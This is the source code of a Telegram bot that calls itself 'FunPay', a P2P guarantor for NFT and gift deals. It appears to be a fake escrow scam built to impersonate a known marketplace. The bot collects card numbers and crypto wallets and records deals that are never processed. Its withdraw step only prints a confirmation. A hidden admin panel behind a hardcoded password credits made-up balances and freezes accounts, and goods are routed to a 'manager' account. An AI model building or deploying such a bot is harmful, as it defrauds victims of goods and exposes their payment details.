import os
import asyncio, json, os, logging, random, string
from datetime import datetime
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

logging.basicConfig(level=logging.INFO, format='%(asctime)s | %(levelname)s | %(message)s')
logger = logging.getLogger(__name__)

BOT_TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_PASS = '2244'
DB_FILE = 'funpay_db.json'

bot = AsyncTeleBot(BOT_TOKEN)
user_states = {}

def load_db():
    return json.load(open(DB_FILE)) if os.path.exists(DB_FILE) else {}

def save_db(data):
    json.dump(data, open(DB_FILE, 'w'), indent=2, ensure_ascii=False)

def get_user(uid):
    db = load_db()
    uid = str(uid)
    if uid not in db:
        db[uid] = {
            'ton': '', 'card': '', 'stars': '', 'usdt': '', 'btc': '',
            'balance': 0.0, 'deals': [], 'ref_count': 0, 'ref_earned': 0.0,
            'ref_code': ''.join(random.choices(string.digits, k=8)),
            'lang': 'ru', 'frozen': False, 'blocked': False
        }
        save_db(db)
    return db[uid]

def save_user(uid, data):
    db = load_db()
    db[str(uid)] = data
    save_db(db)

TEXTS = {
    'ru': {
        'welcome': """
Добро пожаловать в FunPay 🎉

Ваш надёжный P2P-гарант:
1️⃣ Автоматические сделки с NFT и подарками
2️⃣ Полная защита обеих сторон
3️⃣ Реферальная программа — 50% от комиссии
4️⃣ Передача товаров через менеджера: @SupOTC

Выберите действие ниже
""",
        'req_title': 'Мои реквизиты',
        'ton_wallet': 'TON-кошелёк',
        'card': 'Карта',
        'stars': '@username (Stars)',
        'usdt': 'USDT-кошелёк',
        'btc': 'BTC-кошелёк',
        'back': 'Назад в меню',
        'enter_ton': '💬 Введите новый TON-кошелёк:',
        'enter_card': '🔄 Введите номер карты:',
        'enter_stars': '⭐ Введите @username для Stars (без @):',
        'enter_usdt': '🌐 Введите USDT-адрес (TRC20):',
        'enter_btc': '⏱️ Введите BTC-адрес:',
        'new_deal': '📝 Новая сделка',
        'who_are_you': 'Кем вы выступаете в этой сделке?',
        'seller': '✅ Я продавец',
        'buyer': '❌ Я покупатель',
        'seller_desc': '✅ Продавец — вы продаёте товар/услугу и получаете оплату.',
        'buyer_desc': '❌ Покупатель — вы платите и получаете товар/услугу.',
        'payment_method': '1. Способ получения оплаты:\nКак покупатель переведёт средства?',
        'payment_method_buyer': '1. Способ оплаты:\nКаким способом вы хотите оплатить?',
        'card_btn': '💳 Карта',
        'stars_btn': '⭐ Stars',
        'crypto_btn': '🪙 Крипта',
        'fill_req_first': 'Сначала добавьте данные в «Мои реквизиты».',
        'balance': '💰 Баланс',
        'balance_text': '$ Ваш баланс: {balance} TON\n📈 Завершённых сделок: {deals}\n❗ Для вывода средств необходимо минимум 1 завершённых сделок',
        'withdraw': '💸 Вывод средств',
        'transactions': '📋 Транзакции',
        'my_deals': '📚 Мои сделки',
        'deals_text': 'Всего: 0\nЗавершено: 0',
        'search_code': '🔍 Поиск по коду',
        'refs': '👥 Рефералы',
        'ref_text': 'Реферальная программа',
        'ref_link': 'Ваша ссылка: https://t.me/FunPayCloneBot?start=ref_{code}',
        'ref_count': '🔒 Рефералов: {count}',
        'ref_earned': '📈 Заработано: {earned} TON',
        'ref_bonus': 'Бонус: 50% от комиссии с каждой сделки реферала!',
        'copy_ref': '📋 Скопировать реф. ссылку',
        'lang': '🌐 Язык / Lang',
        'choose_lang': 'Выберите язык:',
        'support': '📞 Техподдержка',
        'support_msg': 'По всем вопросам обращайтесь к менеджеру: @SupOTC',
        'no_ton': '—',
        'saved': '✅ Сохранено!',
        'profile': 'Личный кабинет: {uid}',
        'frozen': '❄️ Аккаунт заморожен',
        'blocked': '🚫 Аккаунт заблокирован'
    },
    'en': {
        'welcome': """
Welcome to FunPay 🎉

Your reliable P2P guarantor:
1️⃣ Automated deals with NFT and gifts
2️⃣ Full protection for both sides
3️⃣ Referral program — 50% commission
4️⃣ Transfer of goods via manager: @SupOTC

Choose an action below
""",
        'req_title': 'My Details',
        'ton_wallet': 'TON Wallet',
        'card': 'Card',
        'stars': '@username (Stars)',
        'usdt': 'USDT Wallet',
        'btc': 'BTC Wallet',
        'back': 'Back to menu',
        'enter_ton': '💬 Enter new TON wallet:',
        'enter_card': '🔄 Enter card number:',
        'enter_stars': '⭐ Enter @username for Stars (without @):',
        'enter_usdt': '🌐 Enter USDT address (TRC20):',
        'enter_btc': '⏱️ Enter BTC address:',
        'new_deal': '📝 New Deal',
        'who_are_you': 'Who are you in this deal?',
        'seller': '✅ I am Seller',
        'buyer': '❌ I am Buyer',
        'seller_desc': '✅ Seller — you sell goods/services and receive payment.',
        'buyer_desc': '❌ Buyer — you pay and receive goods/services.',
        'payment_method': '1. Payment method:\nHow will the buyer transfer funds?',
        'payment_method_buyer': '1. Payment method:\nHow do you want to pay?',
        'card_btn': '💳 Card',
        'stars_btn': '⭐ Stars',
        'crypto_btn': '🪙 Crypto',
        'fill_req_first': 'First add your details in "My Details".',
        'balance': '💰 Balance',
        'balance_text': '$ Your balance: {balance} TON\n📈 Completed deals: {deals}\n❗ Minimum 1 completed deal for withdrawal',
        'withdraw': '💸 Withdraw',
        'transactions': '📋 Transactions',
        'my_deals': '📚 My Deals',
        'deals_text': 'Total: 0\nCompleted: 0',
        'search_code': '🔍 Search by code',
        'refs': '👥 Referrals',
        'ref_text': 'Referral Program',
        'ref_link': 'Your link: https://t.me/FunPayCloneBot?start=ref_{code}',
        'ref_count': '🔒 Referrals: {count}',
        'ref_earned': '📈 Earned: {earned} TON',
        'ref_bonus': 'Bonus: 50% of commission from each referral deal!',
        'copy_ref': '📋 Copy referral link',
        'lang': '🌐 Language / Lang',
        'choose_lang': 'Choose language:',
        'support': '📞 Support',
        'support_msg': 'For any questions contact manager: @SupOTC',
        'no_ton': '—',
        'saved': '✅ Saved!',
        'profile': 'Personal account: {uid}',
        'frozen': '❄️ Account frozen',
        'blocked': '🚫 Account blocked'
    }
}

def t(uid, key, **kwargs):
    user = get_user(uid)
    lang = user.get('lang', 'ru')
    text = TEXTS.get(lang, TEXTS['ru']).get(key, key)
    return text.format(**kwargs) if kwargs else text

def main_menu(uid):
    kb = [
        [InlineKeyboardButton('📋 Мои реквизиты', callback_data='menu_req'), InlineKeyboardButton('📝 Создать сделку', callback_data='menu_deal')],
        [InlineKeyboardButton('💰 Баланс', callback_data='menu_balance'), InlineKeyboardButton('📚 Мои сделки', callback_data='menu_deals')],
        [InlineKeyboardButton('👥 Рефералы', callback_data='menu_refs'), InlineKeyboardButton('🌐 Язык / Lang', callback_data='menu_lang')],
        [InlineKeyboardButton('📞 Техподдержка', callback_data='menu_support')]
    ]
    return InlineKeyboardMarkup(kb)

def back_button(uid):
    return InlineKeyboardMarkup([[InlineKeyboardButton('📌 Назад в меню', callback_data='back_main')]])

def admin_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton('👥 Список юзеров', callback_data='adm_users')],
        [InlineKeyboardButton('❄️ Заморозить', callback_data='adm_freeze')],
        [InlineKeyboardButton('🚫 Заблокировать', callback_data='adm_block')],
        [InlineKeyboardButton('💰 Начислить баланс', callback_data='adm_addmoney')],
        [InlineKeyboardButton('📊 Статистика', callback_data='adm_stats')],
        [InlineKeyboardButton('🔙 Выход', callback_data='back_main')]
    ])

def admin_users_keyboard(page=0):
    db = load_db()
    users = list(db.items())
    total = len(users)
    pages = max((total + 4) // 5, 1)
    start = page * 5
    chunk = users[start:start+5]
    kb = []
    for uid, data in chunk:
        status = ''
        if data.get('blocked'): status = '🚫'
        elif data.get('frozen'): status = '❄️'
        else: status = '✅'
        kb.append([InlineKeyboardButton(f"{status} ID:{uid} ({data.get('balance',0)} TON)", callback_data=f'adm_user_{uid}')])
    nav = []
    if page > 0: nav.append(InlineKeyboardButton('◀️', callback_data=f'adm_upage_{page-1}'))
    nav.append(InlineKeyboardButton(f'{page+1}/{pages}', callback_data='none'))
    if page < pages-1: nav.append(InlineKeyboardButton('▶️', callback_data=f'adm_upage_{page+1}'))
    kb.append(nav)
    kb.append([InlineKeyboardButton('🔙 Назад', callback_data='adm_back')])
    return InlineKeyboardMarkup(kb)

@bot.message_handler(commands=['start'])
async def start(msg):
    uid = str(msg.from_user.id)
    args = msg.text.split()
    if len(args) > 1 and args[1].startswith('ref_'):
        ref_code = args[1].replace('ref_', '')
        db = load_db()
        for u, data in db.items():
            if data.get('ref_code') == ref_code and u != uid:
                data['ref_count'] = data.get('ref_count', 0) + 1
                save_user(u, data)
                break
    user = get_user(uid)
    if user.get('blocked'):
        await bot.send_message(msg.chat.id, '🚫 Ваш аккаунт заблокирован.')
        return
    if user.get('frozen'):
        await bot.send_message(msg.chat.id, '❄️ Ваш аккаунт заморожен.')
        return
    await bot.send_photo(msg.chat.id, 'https://i.ibb.co/S7y8854h/2026-05-09-23-35-40.jpg', caption=t(uid, 'welcome'), reply_markup=main_menu(uid))

@bot.message_handler(commands=['code'])
async def code_cmd(msg):
    uid = str(msg.from_user.id)
    user_states[uid] = {'step': 'admin_auth'}
    await bot.send_message(msg.chat.id, '🔐 Введите пароль администратора:', reply_markup=back_button(uid))

@bot.callback_query_handler(func=lambda call: True)
async def callback(call):
    uid = str(call.from_user.id)
    data = call.data
    cid, mid = call.message.chat.id, call.message.message_id
    user = get_user(uid)
    
    # Проверка блокировки/заморозки
    if user.get('blocked') and data != 'back_main':
        await bot.answer_callback_query(call.id, '🚫 Аккаунт заблокирован')
        return
    if user.get('frozen') and data != 'back_main':
        await bot.answer_callback_query(call.id, '❄️ Аккаунт заморожен')
        return
    
    try:
        # Админские callback-и
        if data.startswith('adm_'):
            if uid != '7113397602' and uid != '8051267668':
                await bot.answer_callback_query(call.id, 'Нет доступа!')
                return
            await admin_handler(call)
            return
        
        # Главное меню
        if data == 'back_main':
            await bot.edit_message_text(t(uid, 'welcome'), cid, mid, reply_markup=main_menu(uid))
        
        elif data == 'menu_req':
            u = get_user(uid)
            text = f"""📋 {t(uid, 'req_title')}

{t(uid, 'ton_wallet')}: {u['ton'] or t(uid, 'no_ton')}
{t(uid, 'card')}: {u['card'] or t(uid, 'no_ton')}
⭐ Stars: {u['stars'] or '@—'}
🌐 USDT (TRC20): {u['usdt'] or t(uid, 'no_ton')}
₿ BTC: {u['btc'] or t(uid, 'no_ton')}"""
            kb = [
                [InlineKeyboardButton(t(uid, 'ton_wallet'), callback_data='set_ton')],
                [InlineKeyboardButton(t(uid, 'card'), callback_data='set_card')],
                [InlineKeyboardButton(t(uid, 'stars'), callback_data='set_stars')],
                [InlineKeyboardButton(t(uid, 'usdt'), callback_data='set_usdt')],
                [InlineKeyboardButton(t(uid, 'btc'), callback_data='set_btc')],
                [InlineKeyboardButton(t(uid, 'back'), callback_data='back_main')]
            ]
            await bot.edit_message_text(text, cid, mid, reply_markup=InlineKeyboardMarkup(kb))
        
        elif data == 'set_ton':
            user_states[uid] = {'step': 'setting_ton'}
            await bot.edit_message_text(t(uid, 'enter_ton'), cid, mid, reply_markup=back_button(uid))
        elif data == 'set_card':
            user_states[uid] = {'step': 'setting_card'}
            await bot.edit_message_text(t(uid, 'enter_card'), cid, mid, reply_markup=back_button(uid))
        elif data == 'set_stars':
            user_states[uid] = {'step': 'setting_stars'}
            await bot.edit_message_text(t(uid, 'enter_stars'), cid, mid, reply_markup=back_button(uid))
        elif data == 'set_usdt':
            user_states[uid] = {'step': 'setting_usdt'}
            await bot.edit_message_text(t(uid, 'enter_usdt'), cid, mid, reply_markup=back_button(uid))
        elif data == 'set_btc':
            user_states[uid] = {'step': 'setting_btc'}
            await bot.edit_message_text(t(uid, 'enter_btc'), cid, mid, reply_markup=back_button(uid))
        
        elif data == 'menu_deal':
            kb = [
                [InlineKeyboardButton(t(uid, 'seller'), callback_data='deal_seller')],
                [InlineKeyboardButton(t(uid, 'buyer'), callback_data='deal_buyer')],
                [InlineKeyboardButton(t(uid, 'back'), callback_data='back_main')]
            ]
            text = f"""📝 {t(uid, 'new_deal')}

> {t(uid, 'who_are_you')}

{t(uid, 'seller_desc')}
{t(uid, 'buyer_desc')}"""
            await bot.edit_message_text(text, cid, mid, reply_markup=InlineKeyboardMarkup(kb))
        
        elif data in ['deal_seller', 'deal_buyer']:
            user_states[uid] = {'step': 'deal_role', 'role': data}
            kb = [
                [InlineKeyboardButton(t(uid, 'card_btn'), callback_data='pay_card')],
                [InlineKeyboardButton(t(uid, 'stars_btn'), callback_data='pay_stars')],
                [InlineKeyboardButton(t(uid, 'crypto_btn'), callback_data='pay_crypto')],
                [InlineKeyboardButton('🔙 Назад', callback_data='menu_deal')]
            ]
            text = t(uid, 'payment_method') if data == 'deal_seller' else t(uid, 'payment_method_buyer')
            await bot.edit_message_text(text, cid, mid, reply_markup=InlineKeyboardMarkup(kb))
        
        elif data.startswith('pay_'):
            method = data.replace('pay_', '')
            u = get_user(uid)
            if method == 'card' and not u['card']:
                await bot.answer_callback_query(call.id, t(uid, 'fill_req_first'), show_alert=True)
                return
            if method == 'stars' and not u['stars']:
                await bot.answer_callback_query(call.id, t(uid, 'fill_req_first'), show_alert=True)
                return
            if method == 'crypto' and not u['ton']:
                await bot.answer_callback_query(call.id, t(uid, 'fill_req_first'), show_alert=True)
                return
            user_states[uid] = {'step': 'deal_amount', 'method': method, 'role': user_states.get(uid, {}).get('role', 'deal_seller')}
            await bot.edit_message_text('💎 Введите сумму сделки в TON:', cid, mid, reply_markup=back_button(uid))
        
        elif data == 'menu_balance':
            u = get_user(uid)
            completed = sum(1 for d in u['deals'] if d.get('status') == 'completed')
            text = t(uid, 'balance_text', balance=u['balance'], deals=completed)
            kb = [
                [InlineKeyboardButton(t(uid, 'withdraw'), callback_data='withdraw')],
                [InlineKeyboardButton(t(uid, 'transactions'), callback_data='transactions')],
                [InlineKeyboardButton(t(uid, 'back'), callback_data='back_main')]
            ]
            await bot.edit_message_text(text, cid, mid, reply_markup=InlineKeyboardMarkup(kb))
        
        elif data == 'withdraw':
            await bot.edit_message_text('💸 Введите сумму для вывода (минимум 1 TON):', cid, mid, reply_markup=back_button(uid))
            user_states[uid] = {'step': 'withdraw'}
        elif data == 'transactions':
            await bot.edit_message_text('📋 У вас пока нет транзакций.', cid, mid, reply_markup=back_button(uid))
        
        elif data == 'menu_deals':
            kb = [
                [InlineKeyboardButton(t(uid, 'search_code'), callback_data='search_deal')],
                [InlineKeyboardButton(t(uid, 'back'), callback_data='back_main')]
            ]
            await bot.edit_message_text(f"📚 {t(uid, 'deals_text')}", cid, mid, reply_markup=InlineKeyboardMarkup(kb))
        elif data == 'search_deal':
            user_states[uid] = {'step': 'search_deal'}
            await bot.edit_message_text('🔍 Введите код сделки:', cid, mid, reply_markup=back_button(uid))
        
        elif data == 'menu_refs':
            u = get_user(uid)
            ref_link = f"https://t.me/FunPayCloneBot?start=ref_{u['ref_code']}"
            text = f"""👥 {t(uid, 'ref_text')}

{t(uid, 'ref_link', code=u['ref_code'])}
{t(uid, 'ref_count', count=u['ref_count'])}
{t(uid, 'ref_earned', earned=u['ref_earned'])}

{t(uid, 'ref_bonus')}"""
            kb = [
                [InlineKeyboardButton(t(uid, 'copy_ref'), callback_data='copy_ref')],
                [InlineKeyboardButton(t(uid, 'back'), callback_data='back_main')]
            ]
            await bot.edit_message_text(text, cid, mid, reply_markup=InlineKeyboardMarkup(kb))
        elif data == 'copy_ref':
            u = get_user(uid)
            ref_link = f"https://t.me/FunPayCloneBot?start=ref_{u['ref_code']}"
            await bot.send_message(cid, f"📋 Ваша реферальная ссылка:\n{ref_link}")
            await bot.answer_callback_query(call.id, 'Ссылка скопирована!')
        
        elif data == 'menu_lang':
            kb = [
                [InlineKeyboardButton('🇷🇺 Русский', callback_data='lang_ru')],
                [InlineKeyboardButton('🇬🇧 English', callback_data='lang_en')],
                [InlineKeyboardButton(t(uid, 'back'), callback_data='back_main')]
            ]
            await bot.edit_message_text(t(uid, 'choose_lang'), cid, mid, reply_markup=InlineKeyboardMarkup(kb))
        elif data.startswith('lang_'):
            lang = data.replace('lang_', '')
            u = get_user(uid)
            u['lang'] = lang
            save_user(uid, u)
            await bot.answer_callback_query(call.id, '✅ Язык изменён!')
            await bot.edit_message_text(t(uid, 'welcome'), cid, mid, reply_markup=main_menu(uid))
        
        elif data == 'menu_support':
            await bot.edit_message_text(t(uid, 'support_msg'), cid, mid, reply_markup=back_button(uid))
    
    except Exception as e:
        logger.error(f"Callback error: {e}")

async def admin_handler(call):
    uid = str(call.from_user.id)
    data = call.data
    cid, mid = call.message.chat.id, call.message.message_id
    
    if data == 'adm_back':
        await bot.edit_message_text('👑 Админ-панель FunPay:', cid, mid, reply_markup=admin_menu())
    
    elif data == 'adm_users':
        await bot.edit_message_text('👥 Юзеры:', cid, mid, reply_markup=admin_users_keyboard(0))
    
    elif data.startswith('adm_upage_'):
        page = int(data.split('_')[-1])
        await bot.edit_message_text('👥 Юзеры:', cid, mid, reply_markup=admin_users_keyboard(page))
    
    elif data.startswith('adm_user_'):
        target = data.replace('adm_user_', '')
        u = get_user(target)
        status = '🚫 Заблокирован' if u.get('blocked') else '❄️ Заморожен' if u.get('frozen') else '✅ Активен'
        text = f"""👤 Юзер ID: {target}
💰 Баланс: {u['balance']} TON
📊 Сделок: {len(u['deals'])}
👥 Рефералов: {u['ref_count']}
📌 Статус: {status}"""
        kb = [
            [InlineKeyboardButton('❄️ Заморозить' if not u.get('frozen') else '🔥 Разморозить', callback_data=f'adm_freeze_{target}')],
            [InlineKeyboardButton('🚫 Заблокировать' if not u.get('blocked') else '✅ Разблокировать', callback_data=f'adm_block_{target}')],
            [InlineKeyboardButton('💰 Начислить', callback_data=f'adm_add_{target}')],
            [InlineKeyboardButton('🔙 К списку', callback_data='adm_users')]
        ]
        await bot.edit_message_text(text, cid, mid, reply_markup=InlineKeyboardMarkup(kb))
    
    elif data.startswith('adm_freeze_'):
        target = data.replace('adm_freeze_', '')
        u = get_user(target)
        u['frozen'] = not u.get('frozen', False)
        save_user(target, u)
        await bot.answer_callback_query(call.id, '✅ Обновлено!')
        await admin_handler(call)
    
    elif data.startswith('adm_block_'):
        target = data.replace('adm_block_', '')
        u = get_user(target)
        u['blocked'] = not u.get('blocked', False)
        save_user(target, u)
        await bot.answer_callback_query(call.id, '✅ Обновлено!')
        await admin_handler(call)
    
    elif data.startswith('adm_add_'):
        target = data.replace('adm_add_', '')
        user_states[uid] = {'step': 'adm_add_money', 'target': target}
        await bot.edit_message_text(f'💰 Введите сумму для начисления юзеру {target} (TON):', cid, mid, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('🔙 Отмена', callback_data=f'adm_user_{target}')]]))
    
    elif data == 'adm_freeze':
        user_states[uid] = {'step': 'adm_freeze_id'}
        await bot.edit_message_text('❄️ Введите ID юзера для заморозки:', cid, mid, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('🔙 Отмена', callback_data='adm_back')]]))
    
    elif data == 'adm_block':
        user_states[uid] = {'step': 'adm_block_id'}
        await bot.edit_message_text('🚫 Введите ID юзера для блокировки:', cid, mid, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('🔙 Отмена', callback_data='adm_back')]]))
    
    elif data == 'adm_addmoney':
        user_states[uid] = {'step': 'adm_addmoney_id'}
        await bot.edit_message_text('💰 Введите ID юзера для начисления:', cid, mid, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('🔙 Отмена', callback_data='adm_back')]]))
    
    elif data == 'adm_stats':
        db = load_db()
        total_users = len(db)
        total_balance = sum(u.get('balance', 0) for u in db.values())
        total_deals = sum(len(u.get('deals', [])) for u in db.values())
        total_refs = sum(u.get('ref_count', 0) for u in db.values())
        frozen = sum(1 for u in db.values() if u.get('frozen'))
        blocked = sum(1 for u in db.values() if u.get('blocked'))
        text = f"""📊 Статистика FunPay:

👥 Всего юзеров: {total_users}
💰 Общий баланс: {total_balance} TON
📝 Всего сделок: {total_deals}
👥 Всего рефералов: {total_refs}
❄️ Заморожено: {frozen}
🚫 Заблокировано: {blocked}"""
        await bot.edit_message_text(text, cid, mid, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton('🔙 Назад', callback_data='adm_back')]]))

@bot.message_handler(func=lambda m: True)
async def text(msg):
    uid = str(msg.from_user.id)
    state = user_states.get(uid, {})
    step = state.get('step')
    user = get_user(uid)
    
    if step == 'admin_auth':
        if msg.text.strip() == ADMIN_PASS:
            del user_states[uid]
            await bot.send_message(msg.chat.id, '👑 Админ-панель FunPay:', reply_markup=admin_menu())
        else:
            del user_states[uid]
            await bot.send_message(msg.chat.id, '❌ Неверный пароль!')
        return
    
    # Админские действия
    if step == 'adm_freeze_id':
        target = msg.text.strip()
        u = get_user(target)
        u['frozen'] = True
        save_user(target, u)
        del user_states[uid]
        await bot.send_message(msg.chat.id, f'✅ Юзер {target} заморожен!', reply_markup=admin_menu())
        return
    if step == 'adm_block_id':
        target = msg.text.strip()
        u = get_user(target)
        u['blocked'] = True
        save_user(target, u)
        del user_states[uid]
        await bot.send_message(msg.chat.id, f'✅ Юзер {target} заблокирован!', reply_markup=admin_menu())
        return
    if step == 'adm_addmoney_id':
        target = msg.text.strip()
        user_states[uid] = {'step': 'adm_add_money', 'target': target}
        await bot.send_message(msg.chat.id, f'💰 Введите сумму для юзера {target}:')
        return
    if step == 'adm_add_money':
        try:
            amount = float(msg.text.strip())
            target = state.get('target')
            u = get_user(target)
            u['balance'] = u.get('balance', 0) + amount
            save_user(target, u)
            del user_states[uid]
            await bot.send_message(msg.chat.id, f'✅ Начислено {amount} TON юзеру {target}!', reply_markup=admin_menu())
        except:
            await bot.send_message(msg.chat.id, '❌ Введите число!')
        return
    
    # Обычные действия
    if step == 'setting_ton':
        user['ton'] = msg.text.strip()
        save_user(uid, user)
        del user_states[uid]
        await bot.send_message(msg.chat.id, t(uid, 'saved'), reply_markup=main_menu(uid))
    elif step == 'setting_card':
        user['card'] = msg.text.strip()
        save_user(uid, user)
        del user_states[uid]
        await bot.send_message(msg.chat.id, t(uid, 'saved'), reply_markup=main_menu(uid))
    elif step == 'setting_stars':
        user['stars'] = msg.text.strip()
        save_user(uid, user)
        del user_states[uid]
        await bot.send_message(msg.chat.id, t(uid, 'saved'), reply_markup=main_menu(uid))
    elif step == 'setting_usdt':
        user['usdt'] = msg.text.strip()
        save_user(uid, user)
        del user_states[uid]
        await bot.send_message(msg.chat.id, t(uid, 'saved'), reply_markup=main_menu(uid))
    elif step == 'setting_btc':
        user['btc'] = msg.text.strip()
        save_user(uid, user)
        del user_states[uid]
        await bot.send_message(msg.chat.id, t(uid, 'saved'), reply_markup=main_menu(uid))
    elif step == 'deal_amount':
        try:
            amount = float(msg.text.strip())
            deal_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
            deal = {
                'code': deal_code,
                'amount': amount,
                'method': state.get('method'),
                'role': state.get('role'),
                'status': 'active',
                'time': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
            user['deals'].append(deal)
            save_user(uid, user)
            del user_states[uid]
            role_text = 'Продавец' if state.get('role') == 'deal_seller' else 'Покупатель'
            await bot.send_message(msg.chat.id,
                f"✅ Сделка создана!\n\n📝 Код: {deal_code}\n👤 Роль: {role_text}\n💎 Сумма: {amount} TON\n💳 Способ: {state.get('method')}\n\nПередайте код сделки второй стороне.",
                reply_markup=main_menu(uid))
        except:
            await bot.send_message(msg.chat.id, '❌ Введите число!', reply_markup=back_button(uid))
    elif step == 'withdraw':
        del user_states[uid]
        await bot.send_message(msg.chat.id, '✅ Заявка на вывод создана. Ожидайте.', reply_markup=main_menu(uid))
    elif step == 'search_deal':
        code = msg.text.strip()
        found = None
        for d in user['deals']:
            if d['code'] == code:
                found = d
                break
        if found:
            await bot.send_message(msg.chat.id, f"📝 Сделка {found['code']}\n💰 Сумма: {found['amount']} TON\n📅 {found['time']}\n📊 Статус: {found['status']}", reply_markup=main_menu(uid))
        else:
            await bot.send_message(msg.chat.id, '❌ Сделка не найдена.', reply_markup=main_menu(uid))
        del user_states[uid]
    else:
        await bot.send_photo(msg.chat.id, 'https://i.ibb.co/S7y8854h/2026-05-09-23-35-40.jpg', caption=t(uid, 'welcome'), reply_markup=main_menu(uid))

async def main():
    logger.info("FunPay бот запущен!")
    await bot.polling(non_stop=True)

if __name__ == '__main__':
    asyncio.run(main())
